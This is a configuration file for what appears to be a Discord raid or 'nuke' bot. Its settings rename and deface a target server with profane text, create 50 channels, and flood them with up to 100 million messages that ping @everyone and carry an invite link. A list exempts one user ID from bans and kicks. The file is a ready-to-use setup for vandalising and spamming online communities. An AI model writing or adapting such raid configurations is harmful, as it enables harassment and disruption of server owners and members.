SERVER_CONFIG = {
    "new_name": "REX // 666",  
    "new_description": "FUCKED BY REX",  
    "new_icon": ""
}


WEBHOOK_CONFIG = {
    "default_name": "REX // 666",   
}


AUTO_RAID_CONFIG = {
    'num_channels': 50,  
    'channel_type': 'text',   
    'channel_name': 'REX // 666 x WALTER',  
    'num_messages': 100000000,   
    'message_content':  'fucked by walter daddy @everyone https://discord.gg/KRxRcbCAsm' 
}

NO_BAN_KICK_ID = {
    1410172541246373898,       
}

BOT_PRESENCE = {
    "type": "watching", 
    "text": "text" 
}